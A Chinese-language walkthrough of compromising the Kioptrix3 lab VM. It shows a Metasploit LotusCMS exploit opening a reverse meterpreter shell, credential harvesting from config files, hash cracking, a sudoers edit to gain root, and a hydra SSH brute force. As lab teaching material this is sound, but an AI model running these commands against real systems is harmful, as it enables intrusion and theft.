打开虚拟机，和攻击机在同一个网段

### 信息收集
#### IP发现
`arp-scan 192.168.159.0/24`和`nmap -sn 192.168.159.0/24`扫描，得到192.168.159.131的目标IP

#### 服务探测
`nmap -sT -sV -Pn -p 1-65535 192.168.159.131`

得到

```
host             port  proto  name  state  info
----             ----  -----  ----  -----  ----
192.168.159.131  22    tcp    ssh   open   OpenSSH 4.7p1 Debian 8ubuntu1.2 protocol 2.0
192.168.159.131  80    tcp    http  open   Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
```

#### web发现
直接访问发现有表单，web可以测试，登录界面是LotusCMS的字样，估计web上有漏洞

### 漏洞分析
```
searchsploit openssh 4.7
searchsploit httpd 2.2
searchsploit php 5.2
searchsploit lotuscms
```

排除没有PoC的不容易利用的漏洞后，有一些可能可以利用的点
```
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)  | exploits/php/remote/18565.rb
```

Web上可能有一些其他漏洞

ssh可以尝试暴破

### 漏洞利用
```
msf5 auxiliary(scanner/mysql/mysql_version) > search lotuscms

Matching Modules
================

   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   1  exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution


msf5 auxiliary(scanner/mysql/mysql_version) > use exploit/multi/http/lcms_php_exec
msf5 exploit(multi/http/lcms_php_exec) > set RHOST 192.168.159.131
RHOST => 192.168.159.131.
msf5 exploit(multi/http/lcms_php_exec) > options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.159.131  yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf5 exploit(multi/http/lcms_php_exec) > set uri /
uri => /
msf5 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38247 bytes) to 192.168.159.131
[*] Meterpreter session 11 opened (192.168.159.128:4444 -> 192.168.159.131:37516) at 2019-09-26 15:22:58 +0800

meterpreter > pwd
/home/www/kioptrix3.com
meterpreter > whoami
[-] Unknown command: whoami.
```

使用msf的内置EXP直接获取了shell

### 后渗透利用
发现`uname -a`和`whoami`命令没办法使用，可能对这个账号有很多限制

查看了`/etc/passwd`，原来用户的shell应该是/bin/sh，并不是bash，顺便发现了两个非root外可以用bash的用户

```
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
```

使用`getuid`和`sysinfo`可以获取当前用户和系统信息

```
meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : Kioptrix3
OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
Meterpreter : php/linux
```

用searchsploit查看2.6.24版本的内核提权漏洞，看起来太多，而且当前的shell的gcc无法使用，暂时不管

www-data的用户目录就是web目录，查看有没有数据库配置文件

```
$ meterpreter > search -d . -f *config*
Found 3 results...
    ./kioptrix3.com/data\config (4096 bytes)
    ./kioptrix3.com/data/modules/Blog/data\config.txt (369 bytes)
    ./kioptrix3.com/gallery\gconfig.php (1440 bytes)
```

查看gconfig.php可以看到数据库密码
```
$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

但是当前用户不能使用mysql客户端，只能试试web上有没有sql注入

扫描器一扫，获取了phpmyadmin的路径，试了刚才找到的数据库密码，可以直接进入

这个时候查询各个表，发现了之前`/etc/passwd`里两个用户的信息
```
dreg 	0d3eccfb887aabd50f243b3f155c0f85
loneferret 	5badcaf789d3d1d09794d8f021f40f0e
```

使用hashcat尝试碰撞hash
```
$ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/fasttrack.txt -o pass.txt --force
```

碰撞出来loneferret的密码为starwars，用ssh成功登录

```
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
loneferret@Kioptrix3:~$ sudo ht
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ export TERM=xterm
loneferret@Kioptrix3:~$ sudo ht
```

进入ht的界面后可以使用ALT操作菜单，选择/etc/sudoers文件，在loneferret的后面加上`/bin/sh`

```
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/sh
```

之后退出
```
loneferret@Kioptrix3:~$ sudo /bin/bash
root@Kioptrix3:~# whoami
root
```

### 其他
在root目录下发现了Congrats.txt，说了两个漏洞，一个是https://www.exploit-db.com/exploits/15891，一个是https://www.exploit-db.com/exploits/17083

可以用SQL注入获取用户名，然后用ht提权

除此之外，web目录还有任意文件读写漏洞，可以获取/etc/passwd，从而得到用户名

然后ssh在得知用户名之后可以直接暴破
```
hydra -l loneferret -P /usr/share/wordlists/fasttrack.txt 192.168.159.131 ssh -t 4
```

可以得到密码starwars
